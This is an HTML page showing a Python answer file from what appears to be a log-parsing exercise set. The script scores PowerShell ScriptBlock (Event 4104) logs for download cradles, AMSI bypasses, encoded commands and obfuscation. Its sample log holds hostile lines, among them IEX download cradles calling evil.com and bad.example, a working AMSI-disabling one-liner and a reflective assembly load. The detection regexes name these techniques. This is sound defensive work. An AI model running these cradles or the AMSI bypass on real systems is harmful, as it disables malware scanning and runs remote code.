@@ -1,0 +1,284 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>q11_powershell_scriptblock.py</title>
+  <link rel="stylesheet"
+        href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github.min.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+  <script>hljs.highlightAll();</script>
+  <style>
+    * { box-sizing: border-box; }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, sans-serif;
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 32px 24px;
+      color: #24292f;
+      background: #fff;
+    }
+    h1 {
+      font-size: 1.4em;
+      border-bottom: 1px solid #d0d7de;
+      padding-bottom: 0.3em;
+      margin-bottom: 0.6em;
+    }
+    .file-path {
+      font-size: 0.8em;
+      color: #57606a;
+      margin-bottom: 16px;
+      font-family: monospace;
+    }
+    .line-count {
+      font-size: 0.78em;
+      color: #8c959f;
+      margin-bottom: 16px;
+    }
+    pre {
+      background: #f6f8fa;
+      border: 1px solid #d0d7de;
+      border-radius: 6px;
+      padding: 16px;
+      overflow-x: auto;
+      counter-reset: line;
+    }
+    code {
+      font-family: "Cascadia Code", "Fira Code", "Courier New", monospace;
+      font-size: 0.88em;
+    }
+  </style>
+</head>
+<body>
+  <h1>q11_powershell_scriptblock.py</h1>
+  <p class="file-path">Source: code\log_parsing\answers\q11_powershell_scriptblock.py</p>
+  <p class="line-count">227 lines</p>
+  <pre><code class="language-python">&quot;&quot;&quot;
+Q11. Windows PowerShell ScriptBlock Log Parser
+================================================
+Parse Event ID 4104 (ScriptBlock logging) to detect download cradles,
+AMSI bypasses, encoded commands, and obfuscation.
+
+=============================================================================
+SOLUTION PROGRESSION
+=============================================================================
+
+NAIVE: Grep for &quot;IEX&quot; and flag.
+  Problem: Attackers encode the string. grep(&quot;IEX&quot;) misses
+  `[char]73+[char]69+[char]88` or `-enc SW...`. Also, no scoring means
+  high false-positive rate — legitimate scripts use IEX too.
+
+BETTER: Check for -EncodedCommand; base64-decode and re-check.
+  Problem: Misses the AMSI bypass patterns, the obfuscation scoring,
+  and the &quot;concat+invoke&quot; patterns that reconstruct dangerous strings at runtime.
+
+GOOGLE-LEVEL (this file):
+  - Base64 decode + recursive analysis on encoded payloads.
+  - Named pattern categories, each with a weight for composite risk scoring.
+  - Obfuscation score: count tick-marks, char-array reconstructions,
+    string reversal, split+join patterns.
+  - Report shows both raw script and decoded payload (if applicable).
+
+Complexity: O(N × L) where L = average script length.
+=============================================================================
+&quot;&quot;&quot;
+
+import re
+import sys
+import base64
+import math
+from collections import defaultdict
+from datetime import datetime
+
+# ─────────────────────────────────────────────────────────────────────────────
+# SAMPLE DATA  (simplified Event 4104 text format)
+# ─────────────────────────────────────────────────────────────────────────────
+
+SAMPLE_LOG = r&quot;&quot;&quot;
+EventID=4104 TimeCreated=2024-03-12T08:00:00Z ComputerName=WKSTN01 UserName=alice ScriptBlock=Write-Host &#x27;Hello World&#x27;
+EventID=4104 TimeCreated=2024-03-12T08:01:00Z ComputerName=WKSTN01 UserName=alice ScriptBlock=IEX (New-Object Net.WebClient).DownloadString(&#x27;http://evil.com/payload.ps1&#x27;)
+EventID=4104 TimeCreated=2024-03-12T08:02:00Z ComputerName=WKSTN01 UserName=alice ScriptBlock=powershell -enc SW1wb3J0LU1vZHVsZSBBY3RpdmVEaXJlY3Rvcnk=
+EventID=4104 TimeCreated=2024-03-12T08:03:00Z ComputerName=WKSTN01 UserName=bob ScriptBlock=[Ref].Assembly.GetType(&#x27;System.Management.Automation.AmsiUtils&#x27;).GetField(&#x27;amsiInitFailed&#x27;,&#x27;NonPublic,Static&#x27;).SetValue($null,$true)
+EventID=4104 TimeCreated=2024-03-12T08:04:00Z ComputerName=WKSTN02 UserName=carol ScriptBlock=$c=&#x27;IEX&#x27;;$u=&#x27;http://bad.example/s.ps1&#x27;;&amp; ([scriptblock]::Create($c+&quot; (New-Object Net.WebClient).DownloadString(&#x27;$u&#x27;)&quot;))
+EventID=4104 TimeCreated=2024-03-12T08:05:00Z ComputerName=WKSTN02 UserName=carol ScriptBlock=sal a New-Object;a IO.MemoryStream; $x = [convert]::FromBase64String(&#x27;dGVzdA==&#x27;); [System.Reflection.Assembly]::Load($x)
+EventID=4104 TimeCreated=2024-03-12T08:06:00Z ComputerName=WKSTN03 UserName=dave ScriptBlock=Get-Process
+&quot;&quot;&quot;
+
+# ─────────────────────────────────────────────────────────────────────────────
+# DETECTION PATTERNS  (pattern, weight, description)
+# ─────────────────────────────────────────────────────────────────────────────
+
+PATTERNS = [
+    # (name, compiled_regex, risk_weight)
+    (&quot;DOWNLOAD_CRADLE_IEX&quot;,
+     re.compile(r&#x27;\bIEX\b|\bInvoke-Expression\b&#x27;, re.IGNORECASE), 4),
+    (&quot;DOWNLOAD_CRADLE_WEBCLIENT&quot;,
+     re.compile(r&#x27;New-Object\s+Net\.WebClient|DownloadString|DownloadFile&#x27;, re.IGNORECASE), 3),
+    (&quot;AMSI_BYPASS&quot;,
+     re.compile(r&#x27;AmsiUtils|amsiInitFailed|amsiContext|AmsiScanBuffer&#x27;, re.IGNORECASE), 5),
+    (&quot;REFLECTION_LOAD&quot;,
+     re.compile(r&#x27;\[System\.Reflection\.Assembly\]::Load|\[Reflection\.Assembly\]::Load&#x27;, re.IGNORECASE), 4),
+    (&quot;ENCODED_COMMAND&quot;,
+     re.compile(r&#x27;-(?:en(?:c(?:odedcommand)?)?)\s+[A-Za-z0-9+/=]{20,}&#x27;, re.IGNORECASE), 3),
+    (&quot;SCRIPTBLOCK_CREATE&quot;,
+     re.compile(r&#x27;\[scriptblock\]::create&#x27;, re.IGNORECASE), 3),
+    (&quot;CONCAT_INVOKE&quot;,
+     re.compile(r&#x27;\$[a-z]+\s*=\s*[\&#x27;&quot;][A-Z]{2,5}[\&#x27;&quot;].*?&amp;\s*\(&#x27;, re.IGNORECASE | re.DOTALL), 3),
+    (&quot;BASE64_DECODE&quot;,
+     re.compile(r&#x27;\[convert\]::FromBase64String|FromBase64|System\.Convert::FromBase64&#x27;, re.IGNORECASE), 2),
+    (&quot;OBFUSCATION_TICKS&quot;,
+     re.compile(r&#x27;`[a-zA-Z]&#x27;), 1),
+    (&quot;CHAR_ARRAY_RECONSTRUCT&quot;,
+     re.compile(r&#x27;\[char\]\d+&#x27;, re.IGNORECASE), 2),
+    (&quot;STRING_REVERSE&quot;,
+     re.compile(r&#x27;-join.*?\[::-1\]|\[array\]::reverse&#x27;, re.IGNORECASE), 3),
+]
+
+# ─────────────────────────────────────────────────────────────────────────────
+# PARSER
+# ─────────────────────────────────────────────────────────────────────────────
+
+LOG_RE = re.compile(
+    r&#x27;EventID=(?P&lt;eid&gt;\d+)\s+&#x27;
+    r&#x27;TimeCreated=(?P&lt;ts&gt;\S+)\s+&#x27;
+    r&#x27;ComputerName=(?P&lt;computer&gt;\S+)\s+&#x27;
+    r&#x27;UserName=(?P&lt;user&gt;\S+)\s+&#x27;
+    r&#x27;ScriptBlock=(?P&lt;script&gt;.+)&#x27;,
+    re.DOTALL,
+)
+
+ENC_CMD_RE = re.compile(
+    r&#x27;-(?:en(?:c(?:odedcommand)?)?)\s+(?P&lt;payload&gt;[A-Za-z0-9+/=]{20,})&#x27;,
+    re.IGNORECASE,
+)
+
+
+def safe_b64_decode(payload: str) -&gt; str | None:
+    &quot;&quot;&quot;Decode base64; return None on failure. Handles UTF-16LE (PowerShell default).&quot;&quot;&quot;
+    try:
+        # PowerShell uses UTF-16LE for -EncodedCommand
+        raw = base64.b64decode(payload + &quot;==&quot;)  # pad to avoid padding errors
+        return raw.decode(&quot;utf-16-le&quot;, errors=&quot;replace&quot;)
+    except Exception:
+        return None
+
+
+def parse_line(line: str) -&gt; dict | None:
+    line = line.strip()
+    if not line:
+        return None
+    m = LOG_RE.match(line)
+    if not m:
+        return None
+    try:
+        ts = datetime.strptime(m.group(&quot;ts&quot;), &quot;%Y-%m-%dT%H:%M:%SZ&quot;).timestamp()
+    except ValueError:
+        return None
+    return {
+        &quot;event_id&quot;: int(m.group(&quot;eid&quot;)),
+        &quot;ts&quot;:       ts,
+        &quot;computer&quot;: m.group(&quot;computer&quot;),
+        &quot;user&quot;:     m.group(&quot;user&quot;),
+        &quot;script&quot;:   m.group(&quot;script&quot;).strip(),
+    }
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# ANALYZER
+# ─────────────────────────────────────────────────────────────────────────────
+
+def analyze_script(script: str) -&gt; tuple[list[dict], int, str | None]:
+    &quot;&quot;&quot;
+    Analyze a script block.
+    Returns (matched_patterns, total_risk_score, decoded_payload_or_None).
+    &quot;&quot;&quot;
+    matches = []
+    score   = 0
+
+    for name, pattern, weight in PATTERNS:
+        if pattern.search(script):
+            count = len(pattern.findall(script))
+            matches.append({&quot;pattern&quot;: name, &quot;weight&quot;: weight, &quot;count&quot;: count})
+            score += weight * min(count, 3)  # cap to avoid extreme scores from repetition
+
+    # Try to decode base64 encoded command
+    decoded = None
+    enc_m   = ENC_CMD_RE.search(script)
+    if enc_m:
+        decoded = safe_b64_decode(enc_m.group(&quot;payload&quot;))
+        if decoded:
+            # Recursively score the decoded payload
+            sub_matches, sub_score, _ = analyze_script(decoded)
+            if sub_matches:
+                matches.append({
+                    &quot;pattern&quot;: &quot;ENCODED_PAYLOAD_CONTAINS&quot;,
+                    &quot;weight&quot;:  sub_score,
+                    &quot;count&quot;:   len(sub_matches),
+                    &quot;sub&quot;:     [s[&quot;pattern&quot;] for s in sub_matches],
+                })
+                score += sub_score
+
+    return matches, score, decoded
+
+
+def risk_label(score: int) -&gt; str:
+    if score &gt;= 8:
+        return &quot;CRITICAL&quot;
+    if score &gt;= 5:
+        return &quot;HIGH&quot;
+    if score &gt;= 2:
+        return &quot;MEDIUM&quot;
+    return &quot;LOW&quot;
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# REPORT
+# ─────────────────────────────────────────────────────────────────────────────
+
+def print_report(records: list[dict]) -&gt; None:
+    print(&quot;=&quot; * 65)
+    print(&quot;POWERSHELL SCRIPTBLOCK LOG ANALYSIS REPORT&quot;)
+    print(&quot;=&quot; * 65)
+
+    flagged = []
+    for r in records:
+        if r[&quot;event_id&quot;] != 4104:
+            continue
+        matches, score, decoded = analyze_script(r[&quot;script&quot;])
+        if not matches:
+            continue
+        flagged.append((score, r, matches, decoded))
+
+    flagged.sort(key=lambda x: x[0], reverse=True)
+
+    for score, r, matches, decoded in flagged:
+        ts = datetime.utcfromtimestamp(r[&quot;ts&quot;]).strftime(&quot;%Y-%m-%dT%H:%M:%SZ&quot;)
+        risk = risk_label(score)
+        print(f&quot;\n  [{risk}] score={score}  user={r[&#x27;user&#x27;]}  host={r[&#x27;computer&#x27;]}  ts={ts}&quot;)
+        print(f&quot;  Script: {r[&#x27;script&#x27;][:120]}{&#x27;...&#x27; if len(r[&#x27;script&#x27;]) &gt; 120 else &#x27;&#x27;}&quot;)
+        for m in matches:
+            print(f&quot;    pattern={m[&#x27;pattern&#x27;]}  weight={m[&#x27;weight&#x27;]}  count={m[&#x27;count&#x27;]}&quot;)
+        if decoded:
+            print(f&quot;  Decoded payload: {decoded[:120]}{&#x27;...&#x27; if len(decoded) &gt; 120 else &#x27;&#x27;}&quot;)
+    print(f&quot;\nTotal flagged: {len(flagged)}&quot;)
+    print(&quot;=&quot; * 65)
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# MAIN
+# ─────────────────────────────────────────────────────────────────────────────
+
+if __name__ == &quot;__main__&quot;:
+    if len(sys.argv) &gt; 1:
+        with open(sys.argv[1], encoding=&quot;utf-8&quot;, errors=&quot;replace&quot;) as fh:
+            raw_lines = fh.readlines()
+    else:
+        print(&quot;[INFO] Using embedded sample data.\n&quot;)
+        raw_lines = SAMPLE_LOG.splitlines(keepends=True)
+
+    records = [r for r in (parse_line(l) for l in raw_lines) if r is not None]
+    print(f&quot;Parsed {len(records)} ScriptBlock log events.\n&quot;)
+    print_report(records)
+</code></pre>
+</body>
+</html>
